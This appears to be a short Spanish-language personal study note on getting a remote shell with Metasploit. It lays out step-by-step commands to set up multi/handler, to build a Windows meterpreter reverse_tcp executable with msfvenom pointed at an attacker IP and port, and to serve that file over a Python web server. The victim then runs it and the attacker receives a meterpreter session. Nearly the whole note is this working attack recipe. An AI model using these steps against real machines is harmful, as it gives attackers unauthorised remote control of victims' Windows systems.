## Multi handler ([[01. Other Notes/01. Hacking/Hacking Generico/Msfvenom|Msfvenom]] + metasploit) ##

1. Dentro de Metasploit 
2. Usamos multi/handler[^1]:
	`use multi/handler`
3. Para configurar la forma en la que recibimos una conexion de una maquina victima usamos :
	`show options`
4. Configuarar la IP de la maquina atacante:
	`set LHOST <IP>`
5. Configurar puerto:
	`set LPORT <Puerto>`
6. Fuera de la consola de Metasploit debemos generar un payload[^2] usaremos [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]:
	`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.28 LPORT=443 -f exe -o reverse.exe`
7. Seleccionar el mismo payload que se a utilizado en [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] en la terminal de metasploit:
	`set PAYLOAD windows/x64/meterpreter/reverse_tcp`
8. Nos compartimos el payload con la maquina atacante:
	`python3 -m http.server 80`
9. Desde la maquina Windows abrimos la IP de la maquina atacante en el navegador y descargamos reverse.exe
10. En la maquina en el que hemos descargado el archivo ejecutamos el archivo reverse.exe
11. Desde la consola de Metasploit ejecutamos:
	`run`
11. Obtendremos un meterpreter.

[^1]: *Multi/handler:* Alternativa a netcat pero mas potente.
[^2]: *Payload:* Archivo .exe que al ejecutarlo en la maquia victima me de un acceso remoto a ella.
